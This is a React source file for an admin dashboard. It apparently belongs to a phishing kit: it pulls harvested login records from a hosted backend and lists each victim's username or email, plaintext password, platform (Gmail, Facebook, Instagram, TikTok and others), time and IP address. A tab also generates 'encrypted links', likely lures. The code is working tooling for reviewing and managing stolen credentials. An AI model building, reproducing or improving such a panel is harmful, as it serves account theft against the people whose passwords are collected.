"use client"
import { useState, useEffect } from "react"
import LinkCreater from './Link/Index'

export default function AdminPanel() {
    const [data, setData] = useState([])
    const [loading, setLoading] = useState(true)
    const [error, setError] = useState("")
    const [currentPage, setCurrentPage] = useState(1)
    const [totalPages, setTotalPages] = useState(1)
    const [totalEntries, setTotalEntries] = useState(0)
    const [searchTerm, setSearchTerm] = useState("")
    const [platformFilter, setPlatformFilter] = useState("")
    const [deletingId, setDeletingId] = useState(null)

    // Encryption Tool States
    const [activeTab, setActiveTab] = useState("login-data") // "login-data" or "encryption"

    const entriesPerPage = 20

    // Fetch login data from API
    const fetchData = async (page = 1, search = "", platform = "") => {
        setLoading(true)
        setError("")
        try {
            const params = new URLSearchParams({
                page: page.toString(),
                limit: entriesPerPage.toString(),
                search,
                platform,
            })
            const response = await fetch(
                `https://social-backend-bice-delta.vercel.app/api/admin/login-data?${params.toString()}`,
            )
            const result = await response.json()
            if (response.ok) {
                setData(result.data)
                setTotalPages(result.totalPages)
                setTotalEntries(result.totalEntries)
                setCurrentPage(result.currentPage)
            } else {
                setError(result.message || "Failed to fetch data")
            }
        } catch (err) {
            setError("Network error. Please try again.")
            console.error("Fetch error:", err)
        } finally {
            setLoading(false)
        }
    }

    useEffect(() => {
        fetchData(currentPage, searchTerm, platformFilter)
    }, [currentPage, searchTerm, platformFilter])

    const handleSearch = (e) => {
        e.preventDefault()
        setCurrentPage(1)
    }

    const handlePageChange = (newPage) => {
        if (newPage >= 1 && newPage <= totalPages) {
            setCurrentPage(newPage)
        }
    }

    // Delete login entry
    const handleDelete = async (id) => {
        if (!window.confirm("Are you sure you want to delete this entry?")) return
        setDeletingId(id)
        try {
            const response = await fetch(`https://social-backend-bice-delta.vercel.app/api/admin/login-data/${id}`, {
                method: "DELETE",
            })
            const result = await response.json()
            if (response.ok) {
                if (data.length === 1 && currentPage > 1) {
                    setCurrentPage(currentPage - 1)
                } else {
                    fetchData(currentPage, searchTerm, platformFilter)
                }
            } else {
                alert(result.message || "Failed to delete entry")
            }
        } catch (err) {
            alert("Network error. Please try again.")
            console.error("Delete error:", err)
        } finally {
            setDeletingId(null)
        }
    }

    // Fixed and improved date formatting with proper validation
    const formatDate = (dateString) => {
        if (!dateString) {
            return { relativeTime: "Unknown", exactTime: "Date not available" }
        }

        let date
        try {
            if (typeof dateString === "string") {
                date = new Date(dateString)
            } else if (typeof dateString === "object" && dateString.$date) {
                date = new Date(dateString.$date)
            } else {
                date = new Date(dateString)
            }

            if (isNaN(date.getTime())) {
                console.warn("Invalid date:", dateString)
                return { relativeTime: "Invalid date", exactTime: "Invalid date format" }
            }
        } catch (error) {
            console.error("Date parsing error:", error, "for date:", dateString)
            return { relativeTime: "Invalid date", exactTime: "Date parsing failed" }
        }

        const now = new Date()
        const diffInMs = now.getTime() - date.getTime()

        if (diffInMs < 0) {
            return {
                relativeTime: "In the future",
                exactTime: date.toLocaleString("en-US", {
                    year: "numeric",
                    month: "short",
                    day: "numeric",
                    hour: "2-digit",
                    minute: "2-digit",
                    second: "2-digit",
                    hour12: true,
                }),
            }
        }

        const diffInSeconds = Math.floor(diffInMs / 1000)
        const diffInMinutes = Math.floor(diffInSeconds / 60)
        const diffInHours = Math.floor(diffInMinutes / 60)
        const diffInDays = Math.floor(diffInHours / 24)
        const diffInWeeks = Math.floor(diffInDays / 7)
        const diffInMonths = Math.floor(diffInDays / 30)
        const diffInYears = Math.floor(diffInDays / 365)

        let relativeTime = ""

        if (diffInSeconds < 30) {
            relativeTime = "just now"
        } else if (diffInSeconds < 60) {
            relativeTime = `${diffInSeconds} seconds ago`
        } else if (diffInMinutes === 1) {
            relativeTime = "1 minute ago"
        } else if (diffInMinutes < 60) {
            relativeTime = `${diffInMinutes} minutes ago`
        } else if (diffInHours === 1) {
            relativeTime = "1 hour ago"
        } else if (diffInHours < 24) {
            relativeTime = `${diffInHours} hours ago`
        } else if (diffInDays === 1) {
            relativeTime = "1 day ago"
        } else if (diffInDays < 7) {
            relativeTime = `${diffInDays} days ago`
        } else if (diffInWeeks === 1) {
            relativeTime = "1 week ago"
        } else if (diffInWeeks < 4) {
            relativeTime = `${diffInWeeks} weeks ago`
        } else if (diffInMonths === 1) {
            relativeTime = "1 month ago"
        } else if (diffInMonths < 12) {
            relativeTime = `${diffInMonths} months ago`
        } else if (diffInYears === 1) {
            relativeTime = "1 year ago"
        } else {
            relativeTime = `${diffInYears} years ago`
        }

        const exactTime = date.toLocaleString("en-US", {
            year: "numeric",
            month: "short",
            day: "numeric",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
            hour12: true,
            timeZoneName: "short",
        })

        return { relativeTime, exactTime }
    }

    // Pagination numbers helper
    const getPageNumbers = () => {
        const pages = []
        const maxVisiblePages = 5
        let startPage = Math.max(1, currentPage - Math.floor(maxVisiblePages / 2))
        const endPage = Math.min(totalPages, startPage + maxVisiblePages - 1)
        if (endPage - startPage + 1 < maxVisiblePages) {
            startPage = Math.max(1, endPage - maxVisiblePages + 1)
        }
        for (let i = startPage; i <= endPage; i++) {
            pages.push(i)
        }
        return pages
    }

    return (
        <div className="min-h-screen bg-gray-900 py-8">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                {/* Header */}
                <div className="mb-8 flex items-center justify-between">
                    <div>
                        <h1 className="text-3xl font-bold text-white">Admin Panel</h1>
                        <p className="text-gray-400 mt-2">Manage login attempts & create encrypted links</p>
                    </div>
                    <div>
                        <a
                            href="/"
                            className="inline-flex items-center px-6 py-3 bg-blue-600 text-white rounded-lg font-semibold hover:bg-blue-700 transition-colors shadow-lg"
                        >
                            <span className="mr-2">🏠</span>
                            Back to Home
                        </a>
                    </div>
                </div>

                {/* Tab Navigation */}
                <div className="mb-6">
                    <div className="border-b border-gray-700">
                        <nav className="-mb-px flex space-x-8">
                            <button
                                onClick={() => setActiveTab("login-data")}
                                className={`py-2 px-1 border-b-2 font-medium text-sm ${activeTab === "login-data"
                                    ? "border-blue-500 text-blue-400"
                                    : "border-transparent text-gray-400 hover:text-gray-300 hover:border-gray-300"
                                    }`}
                            >
                                Login Data ({totalEntries})
                            </button>
                            <button
                                onClick={() => setActiveTab("encryption")}
                                className={`py-2 px-1 border-b-2 font-medium text-sm ${activeTab === "encryption"
                                    ? "border-blue-500 text-blue-400"
                                    : "border-transparent text-gray-400 hover:text-gray-300 hover:border-gray-300"
                                    }`}
                            >
                                🔗 Link Creator
                            </button>
                        </nav>
                    </div>
                </div>

                {activeTab === "encryption" ? (
                    <>
                        {/* Link Creator Section */}
                        <LinkCreater />
                    </>
                ) : (
                    <>
                        {/* Search and Filter */}
                        <div className="bg-gray-800 rounded-lg shadow-lg p-6 mb-6 border border-gray-700">
                            <form onSubmit={handleSearch} className="flex flex-col sm:flex-row gap-4">
                                <div className="flex-1">
                                    <input
                                        type="text"
                                        placeholder="Search by username or email..."
                                        value={searchTerm}
                                        onChange={(e) => setSearchTerm(e.target.value)}
                                        className="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                                    />
                                </div>
                                <div className="sm:w-48">
                                    <select
                                        value={platformFilter}
                                        onChange={(e) => setPlatformFilter(e.target.value)}
                                        className="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                                    >
                                        <option value="">All Platforms</option>
                                        <option value="gmail">Gmail</option>
                                        <option value="facebook">Facebook</option>
                                        <option value="instagram">Instagram</option>
                                        <option value="telegram">Telegram</option>
                                        <option value="tiktok">TikTok</option>
                                        <option value="twitter">Twitter</option>
                                        <option value="linkedin">LinkedIn</option>
                                        <option value="youtube">YouTube</option>
                                    </select>
                                </div>
                                <button
                                    type="submit"
                                    className="px-6 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-gray-800 transition-colors"
                                >
                                    Search
                                </button>
                            </form>
                        </div>

                        {/* Stats */}
                        <div className="bg-gray-800 rounded-lg shadow-lg p-6 mb-6 border border-gray-700">
                            <div className="flex items-center justify-between">
                                <div>
                                    <p className="text-sm text-gray-400">Total Entries</p>
                                    <p className="text-2xl font-bold text-white">{totalEntries.toLocaleString()}</p>
                                </div>
                                <div className="text-right">
                                    <p className="text-sm text-gray-400">
                                        Showing {data.length} of {totalEntries} entries
                                    </p>
                                    <p className="text-sm text-gray-400">
                                        Page {currentPage} of {totalPages}
                                    </p>
                                </div>
                            </div>
                        </div>

                        {/* Data Table */}
                        <div className="bg-gray-800 rounded-lg shadow-lg overflow-hidden border border-gray-700">
                            {loading ? (
                                <div className="flex items-center justify-center py-12">
                                    <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"></div>
                                    <span className="ml-3 text-gray-300">Loading...</span>
                                </div>
                            ) : error ? (
                                <div className="flex items-center justify-center py-12">
                                    <div className="text-center">
                                        <div className="text-red-400 text-xl mb-2">⚠️</div>
                                        <p className="text-red-400 font-medium">{error}</p>
                                        <button
                                            onClick={() => fetchData(currentPage, searchTerm, platformFilter)}
                                            className="mt-4 px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 transition-colors"
                                        >
                                            Retry
                                        </button>
                                    </div>
                                </div>
                            ) : data.length === 0 ? (
                                <div className="flex items-center justify-center py-12">
                                    <div className="text-center">
                                        <div className="text-gray-500 text-xl mb-2">📭</div>
                                        <p className="text-gray-400">No data found</p>
                                    </div>
                                </div>
                            ) : (
                                <>
                                    <div className="overflow-x-auto">
                                        <table className="min-w-full divide-y divide-gray-700">
                                            <thead className="bg-gray-900">
                                                <tr>
                                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                                                        #
                                                    </th>
                                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                                                        Username/Email
                                                    </th>
                                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                                                        Password
                                                    </th>
                                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                                                        Platform
                                                    </th>
                                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                                                        Date & Time
                                                    </th>
                                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                                                        IP Address
                                                    </th>
                                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                                                        Actions
                                                    </th>
                                                </tr>
                                            </thead>
                                            <tbody className="bg-gray-800 divide-y divide-gray-700">
                                                {data.map((entry, index) => {
                                                    const dateInfo = formatDate(entry.date || entry.createdAt || entry.timestamp)
                                                    return (
                                                        <tr key={entry._id || entry.id || index} className="hover:bg-gray-700 transition-colors">
                                                            <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-400">
                                                                {(currentPage - 1) * entriesPerPage + index + 1}
                                                            </td>
                                                            <td className="px-6 py-4 whitespace-nowrap">
                                                                <div className="text-sm font-medium text-white">
                                                                    {entry.username || entry.email || "N/A"}
                                                                </div>
                                                            </td>
                                                            <td className="px-6 py-4 whitespace-nowrap">
                                                                <div className="text-sm text-white font-mono bg-gray-700 px-2 py-1 rounded border border-gray-600">
                                                                    {entry.password || "N/A"}
                                                                </div>
                                                            </td>
                                                            <td className="px-6 py-4 whitespace-nowrap">
                                                                <span
                                                                    className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${entry.platform === "gmail"
                                                                        ? "bg-red-900 text-red-200 border border-red-700"
                                                                        : entry.platform === "facebook"
                                                                            ? "bg-blue-900 text-blue-200 border border-blue-700"
                                                                            : entry.platform === "instagram"
                                                                                ? "bg-pink-900 text-pink-200 border border-pink-700"
                                                                                : entry.platform === "telegram"
                                                                                    ? "bg-cyan-900 text-cyan-200 border border-cyan-700"
                                                                                    : entry.platform === "tiktok"
                                                                                        ? "bg-gray-700 text-gray-200 border border-gray-600"
                                                                                        : entry.platform === "twitter"
                                                                                            ? "bg-sky-900 text-sky-200 border border-sky-700"
                                                                                            : entry.platform === "linkedin"
                                                                                                ? "bg-indigo-900 text-indigo-200 border border-indigo-700"
                                                                                                : entry.platform === "youtube"
                                                                                                    ? "bg-red-900 text-red-200 border border-red-700"
                                                                                                    : "bg-gray-700 text-gray-200 border border-gray-600"
                                                                        }`}
                                                                >
                                                                    {entry.platform
                                                                        ? entry.platform.charAt(0).toUpperCase() + entry.platform.slice(1)
                                                                        : "Unknown"}
                                                                </span>
                                                            </td>
                                                            <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
                                                                <div className="flex flex-col">
                                                                    <span className="font-medium text-white">{dateInfo.relativeTime}</span>
                                                                    <span className="text-xs text-gray-400" title={dateInfo.exactTime}>
                                                                        {dateInfo.exactTime}
                                                                    </span>
                                                                </div>
                                                            </td>
                                                            <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300 font-mono">
                                                                {entry.ipAddress || entry.ip || "N/A"}
                                                            </td>
                                                            <td className="px-6 py-4 whitespace-nowrap text-sm">
                                                                <button
                                                                    onClick={() => handleDelete(entry._id || entry.id)}
                                                                    disabled={deletingId === (entry._id || entry.id)}
                                                                    className="px-3 py-1 bg-red-600 text-white rounded hover:bg-red-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                                                                >
                                                                    {deletingId === (entry._id || entry.id) ? "Deleting..." : "Delete"}
                                                                </button>
                                                            </td>
                                                        </tr>
                                                    )
                                                })}
                                            </tbody>
                                        </table>
                                    </div>

                                    {/* Pagination */}
                                    {totalPages > 1 && (
                                        <div className="bg-gray-800 px-4 py-3 border-t border-gray-700 sm:px-6">
                                            <div className="flex items-center justify-between">
                                                <div className="flex-1 flex justify-between sm:hidden">
                                                    <button
                                                        onClick={() => handlePageChange(currentPage - 1)}
                                                        disabled={currentPage === 1}
                                                        className="relative inline-flex items-center px-4 py-2 border border-gray-600 text-sm font-medium rounded-md text-gray-300 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 disabled:cursor-not-allowed"
                                                    >
                                                        Previous
                                                    </button>
                                                    <button
                                                        onClick={() => handlePageChange(currentPage + 1)}
                                                        disabled={currentPage === totalPages}
                                                        className="ml-3 relative inline-flex items-center px-4 py-2 border border-gray-600 text-sm font-medium rounded-md text-gray-300 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 disabled:cursor-not-allowed"
                                                    >
                                                        Next
                                                    </button>
                                                </div>
                                                <div className="hidden sm:flex-1 sm:flex sm:items-center sm:justify-between">
                                                    <div>
                                                        <p className="text-sm text-gray-400">
                                                            Showing{" "}
                                                            <span className="font-medium text-white">{(currentPage - 1) * entriesPerPage + 1}</span>{" "}
                                                            to{" "}
                                                            <span className="font-medium text-white">
                                                                {Math.min(currentPage * entriesPerPage, totalEntries)}
                                                            </span>{" "}
                                                            of <span className="font-medium text-white">{totalEntries}</span> results
                                                        </p>
                                                    </div>
                                                    <div>
                                                        <nav className="relative z-0 inline-flex rounded-md shadow-sm -space-x-px">
                                                            {/* Previous Button */}
                                                            <button
                                                                onClick={() => handlePageChange(currentPage - 1)}
                                                                disabled={currentPage === 1}
                                                                className="relative inline-flex items-center px-2 py-2 rounded-l-md border border-gray-600 bg-gray-700 text-sm font-medium text-gray-300 hover:bg-gray-600 disabled:opacity-50 disabled:cursor-not-allowed"
                                                            >
                                                                ←
                                                            </button>

                                                            {/* First Page */}
                                                            {getPageNumbers()[0] > 1 && (
                                                                <>
                                                                    <button
                                                                        onClick={() => handlePageChange(1)}
                                                                        className="relative inline-flex items-center px-4 py-2 border border-gray-600 bg-gray-700 text-sm font-medium text-gray-300 hover:bg-gray-600"
                                                                    >
                                                                        1
                                                                    </button>
                                                                    {getPageNumbers()[0] > 2 && (
                                                                        <span className="relative inline-flex items-center px-4 py-2 border border-gray-600 bg-gray-700 text-sm font-medium text-gray-300">
                                                                            ...
                                                                        </span>
                                                                    )}
                                                                </>
                                                            )}

                                                            {/* Page Numbers */}
                                                            {getPageNumbers().map((pageNum) => (
                                                                <button
                                                                    key={pageNum}
                                                                    onClick={() => handlePageChange(pageNum)}
                                                                    className={`relative inline-flex items-center px-4 py-2 border text-sm font-medium ${pageNum === currentPage
                                                                        ? "z-10 bg-blue-600 border-blue-500 text-white"
                                                                        : "bg-gray-700 border-gray-600 text-gray-300 hover:bg-gray-600"
                                                                        }`}
                                                                >
                                                                    {pageNum}
                                                                </button>
                                                            ))}

                                                            {/* Last Page */}
                                                            {getPageNumbers()[getPageNumbers().length - 1] < totalPages && (
                                                                <>
                                                                    {getPageNumbers()[getPageNumbers().length - 1] < totalPages - 1 && (
                                                                        <span className="relative inline-flex items-center px-4 py-2 border border-gray-600 bg-gray-700 text-sm font-medium text-gray-300">
                                                                            ...
                                                                        </span>
                                                                    )}
                                                                    <button
                                                                        onClick={() => handlePageChange(totalPages)}
                                                                        className="relative inline-flex items-center px-4 py-2 border border-gray-600 bg-gray-700 text-sm font-medium text-gray-300 hover:bg-gray-600"
                                                                    >
                                                                        {totalPages}
                                                                    </button>
                                                                </>
                                                            )}

                                                            {/* Next Button */}
                                                            <button
                                                                onClick={() => handlePageChange(currentPage + 1)}
                                                                disabled={currentPage === totalPages}
                                                                className="relative inline-flex items-center px-2 py-2 rounded-r-md border border-gray-600 bg-gray-700 text-sm font-medium text-gray-300 hover:bg-gray-600 disabled:opacity-50 disabled:cursor-not-allowed"
                                                            >
                                                                →
                                                            </button>
                                                        </nav>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    )}
                                </>
                            )}
                        </div>
                    </>
                )}
            </div>
        </div>
    )
}
